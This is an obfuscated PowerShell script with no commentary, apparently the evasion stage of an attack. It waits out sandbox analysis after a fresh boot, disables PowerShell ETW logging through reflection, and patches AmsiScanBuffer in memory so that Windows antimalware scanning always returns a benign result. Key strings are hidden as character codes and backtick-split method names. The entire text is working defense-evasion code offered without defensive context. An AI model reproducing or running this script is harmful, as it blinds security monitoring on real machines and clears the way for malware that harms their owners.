$__cmdletization_objectModelWrapper = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime;if ($__cmdletization_objectModelWrapper.TotalMinutes -lt 5) {Start-Sleep -Seconds 300}

$LogProvider = [Ref].Assembly."G`etType"(-join([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)))
$Provider = $LogProvider."G`etField"(-join([char[]](101,116,119,80,114,111,118,105,100,101,114)),-join([char[]](78,111,110,80,117,98,108,105,99,44,83,116,97,116,105,99))).GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField(-join([char[]](109,95,101,110,97,98,108,101,100)),-join([char[]](78,111,110,80,117,98,108,105,99,44,73,110,115,116,97,110,99,101))).SetValue($Provider,0)

$libPath = -join [char[]]@(107, 101, 114, 110, 101, 108, 98, 97, 115, 101, 46, 100, 108, 108)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Syscalls {
    [DllImport("$libpath", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("$libpath", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string libPath);

    [DllImport("$libpath", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

[Syscalls]::VirtualProtect([Syscalls]::GetProcAddress([Syscalls]::LoadLibrary(-join [char[]]@(97, 109, 115, 105, 46, 100, 108, 108)), -join [char[]]@(65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114)), [UIntPtr]::new(0x5), 0x40, [Ref]0);
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [UInt32]0x80, [UInt32]0xC3), 0, [Syscalls]::GetProcAddress([Syscalls]::LoadLibrary(-join [char[]]@(97, 109, 115, 105, 46, 100, 108, 108)), -join [char[]]@(65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114)), 6);
